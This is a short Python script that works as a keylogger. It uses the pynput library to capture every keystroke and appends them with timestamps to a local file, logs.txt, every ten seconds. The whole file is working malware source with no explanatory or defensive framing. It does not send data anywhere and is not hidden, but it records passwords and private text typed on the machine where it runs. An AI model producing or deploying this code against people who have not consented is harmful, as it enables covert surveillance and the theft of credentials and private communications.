import pynput.keyboard
import threading
import datetime

log_file = "logs.txt"
log_data = []

def on_key_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            log_data.append(key.char)
        elif key == key.space:
            log_data.append(' ')
        else:
            log_data.append(f'[{key.name}]')
    except Exception as e:
        log_data.append(f"[ERROR:{e}]")

def write_log():
    if log_data:
        with open(log_file, "a") as file:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            file.write(f"\n[{timestamp}] ")
            file.write(''.join(log_data))
            file.write("\n")
        log_data.clear()
    threading.Timer(10, write_log).start()

def start_logger():
    write_log()
    with pynput.keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()

if __name__ == "__main__":
    print("Keylogger started... (Press Ctrl+C to stop)")
    start_logger()
